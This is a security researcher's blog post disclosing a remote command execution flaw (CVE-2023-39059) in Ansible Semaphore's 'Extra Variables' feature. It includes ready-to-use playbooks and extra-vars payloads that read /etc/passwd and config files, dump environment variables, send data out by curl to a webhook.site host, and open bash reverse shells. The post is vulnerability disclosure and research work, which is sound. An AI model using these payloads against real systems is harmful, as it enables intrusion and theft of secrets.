<!doctype html><html lang=en-us><head>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<title>A Quick Story Of Security Pitfalls With Exec.Command In Software Integrations</title>
<meta name=description content="Software Engineering and Information Security">
<meta name=author content="Lenin Alevski">
<link href="https://fonts.googleapis.com/css2?family=Inconsolata:wght@400;700&display=swap" rel=stylesheet>
<link rel=stylesheet href=/css/bootstrap.min.css>
<link rel=stylesheet href=/css/all.min.css>
<link rel=stylesheet href=/css/academicons.min.css>
<link rel=stylesheet href=/sass/researcher.min.css>
<link rel=icon type=image/ico href=/favicon.ico>
<meta property="og:title" content="A Quick Story Of Security Pitfalls With Exec.Command In Software Integrations">
<meta property="og:description" content="This vulnerability has been reported to https://www.cve.org/ and a CVE has been assigned ð. Read about CVE-2023-39059
 In this article, I aim to talk about an interesting open-source project that I came across a couple of weeks ago while making some upgrades in my home lab. This project caught my attention and turned into the main subject of my weekend security research.
  Introduction
  Preparation">
<meta property="og:type" content="article">
<meta property="og:url" content="/2023/07/a-quick-story-of-security-pitfalls-with-execcommand-in-software-integrations/"><meta property="og:image" content="/images/ansible-semaphore.jpg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2023-07-01T00:41:33+00:00">
<meta property="article:modified_time" content="2023-07-01T00:41:33+00:00">
</head>
<body>
<nav class=navigation>
<a href=/> <span class=arrow>â</span>Home</a>
<a href=/posts>Posts</a>
<a href=/tags>Tags</a>
<a href=/about>About</a>
<a href=/work-experience>Career</a>
<a href=/talks>Talks</a>
</nav>
<div class=container>
<nav class="navbar navbar-expand-sm flex-column flex-sm-row text-nowrap p-0">
<a class="navbar-brand mx-0 mr-sm-auto" href=/ title="Alevski's Blog">
Alevski's Blog
</a>
<div class="navbar-nav flex-row flex-wrap justify-content-center">
</div>
</nav>
</div>
<hr>
<div id=content>
<div class=container>
<article>
<div class=title>
<h1 class=title>A Quick Story Of Security Pitfalls With Exec.Command In Software Integrations</h1>
<div class=meta>
Posted on Jul 1, 2023
<span class=split>
Â·
</span>
<span>
1266 words
</span>
<span class=split>
Â·
</span>
<span>
6 minute read
</span>
</div>
</div>
<hr class=solid>
<section class=body>
<p><img src=/images/ansible-semaphore.jpg alt="Ansible Semaphore"></p>
<blockquote>
<p>This vulnerability has been reported to <a href=https://www.cve.org/>https://www.cve.org/</a> and a CVE has been assigned ð. <a href=#cve-report-cve-2023-39059>Read about CVE-2023-39059</a></p>
</blockquote>
<p>In this article, I aim to talk about an interesting open-source project that I came across a couple of weeks ago while making some upgrades in my home lab. This project caught my attention and turned into the main subject of my weekend security research.</p>
<ul>
<li>
<p><a href=#introduction>Introduction</a></p>
</li>
<li>
<p><a href=#preparation>Preparation</a></p>
</li>
<li>
<p><a href=#hunting-for-vulnerabilities>Hunting for vulnerabilities</a></p>
</li>
<li>
<p><a href=#ansible-security>Ansible Security</a></p>
</li>
<li>
<p><a href=#data-exfiltration-using-the-extra-variables-feature>Data Exfiltration Using The Extra Variables Feature</a></p>
</li>
<li>
<p><a href=#final-thoughts>Final Thoughts</a></p>
</li>
</ul>
<h2 id=introduction>Introduction</h2>
<p>As I mentioned in my previous post, I heavily rely on Ansible for automating tasks in my home lab. I&rsquo;ve accumulated dozens of scripts to automate various actions I repeatedly perform on my virtual machines, which can sometimes become disorganized. I started exploring best practices and tools that could simplify my workflow, and that&rsquo;s when I discovered Ansible Semaphore. Ansible Semaphore is a user-friendly interface for Ansible that allows for the streamlined execution of Ansible playbooks. It also provides notifications on task failures and facilitates access control for deployment systems. After spending time reading about and familiarizing myself with the project, it appeared to be an excellent solution for managing my home lab infrastructure.</p>
<p>As I continued using it over a few days, questions about the security of Ansible Semaphore naturally surfaced in my mind. Given the toolâs capabilities in managing infrastructure, it could be an appealing target for attackers. I probed to see if Ansible Semaphore was susceptible to common web application vulnerabilities such as SQL Injection (SQLi) or Cross-Site Scripting (XSS), but didn&rsquo;t find any issues.</p>
<p>Nonetheless, the project description mentions that Ansible Semaphore allows for the easy execution of Ansible playbooks. This implies the possibility of remote code execution through the tool. With this in mind, I delved into the source code and began examining how Ansible was integrated within the project.</p>
<h2 id=preparation>Preparation</h2>
<p>In preparing for this research, it was essential for me to run and debug the code locally. I found that the developers had done an exemplary job in providing instructions on setting up the development environment for Ansible Semaphore, which can be found here: <a href=https://github.com/ansible-semaphore/semaphore/blob/develop/CONTRIBUTING.md>https://github.com/ansible-semaphore/semaphore/blob/develop/CONTRIBUTING.md</a>.</p>
<p>As I proceeded with setting up my local development environment, I concentrated on accomplishing the following tasks:</p>
<ul>
<li>Cloning the repository to my local machine.</li>
<li>Compiling and executing the project locally.</li>
<li>Running the project using Visual Studio Code (Vscode).</li>
<li>Being able to debug and set breakpoints within Vscode.</li>
</ul>
<h2 id=hunting-for-vulnerabilities>Hunting For Vulnerabilities</h2>
<p>I spent quite a bit of time looking for SQL Injection vulnerabilities but didnât find any. The developers did a really good job cleaning up every single parameter that interacts with the database. Next, I turned my attention to how Ansible Semaphore actually runs the Ansible playbooks. I found out it directly calls the <code>ansible-playbook</code> binary using <code>exec.Command</code> in Go. The use of &lsquo;exec&rsquo; by itself is something to be cautious of when looking into security, so I kept looking into it.</p>
<p><img src=/images/vscode_semaphore_debugging.png alt="Debugging environment using vscode"></p>
<p>The exec package is quite effective in preventing <strong>command</strong> injection vulnerabilities. Unless the attacker has control over the command parameter (which is not the situation here), command injection using only the <strong>args</strong> parameter is not feasible.</p>
<p>After this, I changed my approach to try and find if there was any way to misuse the <code>ansible-playbook</code> application itself, and in doing so, I ventured into the realm of Ansible security.</p>
<h2 id=ansible-security>Ansible Security</h2>
<p>There are already well-established techniques for misusing ansible playbooks. A good starting point is <a href=https://gtfobins.github.io/gtfobins/ansible-playbook/>https://gtfobins.github.io/gtfobins/ansible-playbook/</a>. For example, if you run the following code snippets on a computer where Ansible is installed, the ansible-playbook command will initiate an interactive shell and make an HTTP request to a remote host, in that sequence.</p>
<h3 id=interactive-shell>Interactive Shell</h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>TF<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp<span style=color:#66d9ef>)</span>
echo <span style=color:#e6db74>&#39;[{hosts: localhost, tasks: [shell: /bin/sh &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]&#39;</span> &gt;$TF
ansible-playbook $TF
</code></pre></div><h3 id=server-side-request-forgery-ssrf>Server-Side Request Forgery (SSRF)</h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>TF<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>mktemp<span style=color:#66d9ef>)</span>
echo <span style=color:#e6db74>&#39;[{hosts: localhost, tasks: [shell: curl https://webhook.site/22cbe5dd-bcc8-400c-8097-71f166629b25 &lt;/dev/tty &gt;/dev/tty 2&gt;/dev/tty]}]&#39;</span> &gt;$TF
ansible-playbook $TF
</code></pre></div><p>With this knowledge, I can create the following malicious playbooks. When they are run directly from Ansible Semaphore, they let you read sensitive files on the server, make requests as the host, and even get a reverse shell.</p>
<h3 id=ssrfyaml>ssrf.yaml</h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml>[{<span style=color:#f92672>hosts: localhost, tasks: [shell</span>: <span style=color:#ae81ff>curl https://webhook.site/22cbe5dd-bcc8-400c-8097-71f166629b25 &lt;/dev/null &gt;/dev/null 2&gt;/dev/null]}]</span>
</code></pre></div><h3 id=passwdyaml>passwd.yaml</h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml>- <span style=color:#f92672>hosts</span>: <span style=color:#ae81ff>localhost</span>
  <span style=color:#f92672>tasks</span>:
    - <span style=color:#f92672>name</span>: <span style=color:#ae81ff>Show passwd file</span>
      <span style=color:#f92672>command</span>: <span style=color:#e6db74>&#34;cat /etc/passwd&#34;</span>
</code></pre></div><h3 id=reverse-shellyaml>reverse-shell.yaml</h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml>[{<span style=color:#f92672>hosts: localhost, tasks: [shell</span>: <span style=color:#ae81ff>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/127.0.0.1/1337 &lt;&amp;1&#39;]}]</span>
</code></pre></div><p>However, for an attacker to be able to do this, they first need to have access to the repository from which Ansible Semaphore loads the scripts, and that&rsquo;s not always possible.</p>
<h2 id=data-exfiltration-using-the-extra-variables-feature>Data Exfiltration Using The Extra Variables Feature</h2>
<p>Ansible Semaphore includes a feature called &ldquo;Extra Variables.&rdquo; This feature can be accessed at <code>https://&lt;semaphore-endpoint>/project/id/environment</code> and is directly associated with the ansible-playbook <code>--extra-vars</code> flag.</p>
<p><img src=/images/semaphore_extra_vars.png alt="Extra Variables feature on semaphore"></p>
<p>Ansible extra variables are variables that can be fed into an Ansible playbook during runtime. They can serve to override default values or supply additional information that the playbook does not contain. Extra variables can be passed through the command line or within a YAML file.</p>
<p>To input extra variables via the command line, the <code>--extra-vars</code> or <code>-e</code> option can be utilized. For instance: <code>ansible-playbook playbook.yml --extra-vars "var1=value1 var2=value2"</code></p>
<p>The <code>--extra-vars</code> parameter is something that we, as attackers, can manipulate and potentially exploit. Here are a few examples I found that allow a malicious user to read files and configurations, perform Server Side Request Forgery (SSRF), execute commands, and establish a reverse shell.</p>
<h3 id=retrieving-ansible-semaphore-config-path-via-environment-variable>Retrieving Ansible Semaphore config path via environment variable</h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
  <span style=color:#f92672>&#34;date&#34;</span>: <span style=color:#e6db74>&#34;{{ lookup(&#39;env&#39;, &#39;SEMAPHORE_CONFIG_PATH&#39;) }}&#34;</span>
}
</code></pre></div><h3 id=retrieving-ansible-semaphore-configuration>Retrieving Ansible semaphore configuration</h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
  <span style=color:#f92672>&#34;date&#34;</span>: <span style=color:#e6db74>&#34;{{ lookup(&#39;file&#39;, &#39;~/semaphore/config.json&#39;) }}&#34;</span>
}
</code></pre></div><p><img src=/images/lookup_file.png alt="lookup file"></p>
<h3 id=server-side-request-forgery-retrieving-data-from-remote-server>Server-side request forgery, retrieving data from remote server</h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
  <span style=color:#f92672>&#34;date&#34;</span>: <span style=color:#e6db74>&#34;{{ lookup(&#39;url&#39;, &#39;https://google.com/&#39;) }}&#34;</span>
}
</code></pre></div><p><img src=/images/lookup_url.png alt="lookup url"></p>
<h3 id=retrieving-environment-variables>Retrieving environment variables</h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
  <span style=color:#f92672>&#34;date&#34;</span>: <span style=color:#e6db74>&#34;{{ lookup(&#39;ansible.builtin.pipe&#39;, &#39;env&#39;) }}&#34;</span>
}

</code></pre></div><h3 id=out-of-band-exploitation-oob>Out of Band Exploitation (OOB)</h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
  <span style=color:#f92672>&#34;ansible_user&#34;</span>: <span style=color:#e6db74>&#34;{{ lookup(&#39;ansible.builtin.pipe&#39;, \&#34;curl https://webhook.site/22cbe5dd-bcc8-400c-8097-71f166629b25/whoami \&#34;) }}&#34;</span>
}

</code></pre></div><p><img src=/images/oob.png alt="lookup url"></p>
<h3 id=reverse-shell>Reverse shell</h3>
<p>Ansible provides several variables that are always available and can be overridden using the &ndash;extra-vars parameter.</p>
<ul>
<li>ansible_user</li>
<li>ansible_password</li>
<li>ansible_ssh_private_key_file</li>
<li>ansible_become_pass</li>
<li>ansible_port</li>
<li>ansible_host</li>
<li>ansible_python_interpreter</li>
<li>ansible_connection</li>
<li>ansible_ssh_common_args</li>
<li>ansible_sudo_pass</li>
</ul>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
  <span style=color:#f92672>&#34;ansible_user&#34;</span>: <span style=color:#e6db74>&#34;{{ lookup(&#39;ansible.builtin.pipe&#39;, \&#34;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/127.0.0.1/1337 &lt;&amp;1&#39;\&#34;) }}&#34;</span>
}
</code></pre></div>
<div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden>
<iframe src=https://www.youtube.com/embed/pKvu7tEOoS8 style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 allowfullscreen title="YouTube Video"></iframe>
</div>
<p>The vulnerability is present due to two reasons:</p>
<ul>
<li><code>ansible-playbook</code> permits code execution by design through the <code>extra-vars</code> flag, and this doesnât appear to be documented anywhere (please correct me if I&rsquo;m mistaken).</li>
<li>Ansible Semaphore takes input directly from the user and feeds it to the args parameter in <code>exec.Command(command, args...)</code> without applying any kind of sanitization or filtering.</li>
</ul>
<p>By taking advantage of this vulnerability, a malicious user could escalate privileges, gain control of the host, and potentially all other machines managed by Ansible Semaphore.</p>
<h2 id=final-thoughts>Final Thoughts</h2>
<p>The utilization of <code>exec.Command</code> for invoking external binaries can provide powerful functionality, but it also exposes potential security risks if not handled with care, as seen in the case of Ansible Semaphore with ansible-playbook. It is imperative that developers consider security implications. Input validation and sanitization are critical to mitigate risks such as command injection vulnerabilities. Furthermore, it is advisable to be familiar with the documentation and understand the nature of the programs being integrated.</p>
<h2 id=cve-report-cve-2023-39059>CVE Report (CVE-2023-39059)</h2>
<ul>
<li><strong>CVE ID</strong>: <code>CVE-2023-3905</code></li>
<li><strong>Product</strong>: <a href=https://github.com/ansible-semaphore/semaphore>ansible semaphore</a></li>
<li><strong>Affected version</strong>: <a href=https://github.com/ansible-semaphore/semaphore/releases/tag/v2.8.90>ansible semaphore v2.8.90</a></li>
<li><strong>Description</strong>: An issue in ansible <code>semaphore v.2.8.90</code> allows a remote attacker to execute arbitrary code via a crafted payload to the extra variables parameter.</li>
<li><strong>Vulnerability Type</strong>: Remote Command Execution (RCE)</li>
<li><strong>Root Cause</strong>: Ansible Semaphore includes a feature called &ldquo;Extra Variables.&rdquo; This feature can be accessed at <code>https://&lt;semaphore-endpoint>/project/id/environment</code> and is directly associated with the ansible-playbook <code>--extra-vars</code> flag.</li>
<li><strong>Impact</strong>: The <code>--extra-vars</code> parameter can be abused by a malicious user with low privileges to achieve Remote Command Execution (RCE) and read files and configurations, perform Server Side Request Forgery (SSRF), execute commands, and establish a reverse shell on the ansible server.</li>
</ul>
<p>Happy hacking</p>
</section>
<div class=post-tags>
<hr class=solid>
<div class=title>
<h2 class=title>Tags</h1>
</div>
<nav class="nav tags">
<ul class=tags>
<li><a href=/tags/ansible>Ansible</a></li>
<li><a href=/tags/homelab>Homelab</a></li>
<li><a href=/tags/security>Security</a></li>
<li><a href=/tags/research>Research</a></li>
<li><a href=/tags/automation>Automation</a></li>
</ul>
</nav>
</div>
</article>
</div>
</div><div id=footer class=mb-5>
<hr>
<div class="container text-center">
<a href=https://twitter.com/alevskey class="fab fa-twitter fa-1x" title=Twitter></a>
<a href=https://www.linkedin.com/in/alevsk class="fab fa-linkedin fa-1x" title=Linkedin></a>
<a href=https://github.com/alevsk class="fab fa-github fa-1x" title=Github></a>
</div>
<div class="container text-center">
<a href=/terms-and-conditions title="Terms And Conditions"><small>Terms And Conditions</small></a>
</div>
<div class="container text-center">
<a href="https://pgp.mit.edu/pks/lookup?op=get&search=0x67BA54C7DE3DD14A" title=0x67BA54C7DE3DD14A><small>0x67BA54C7DE3DD14A</small></a>
</div>
</div>
</body>
</html>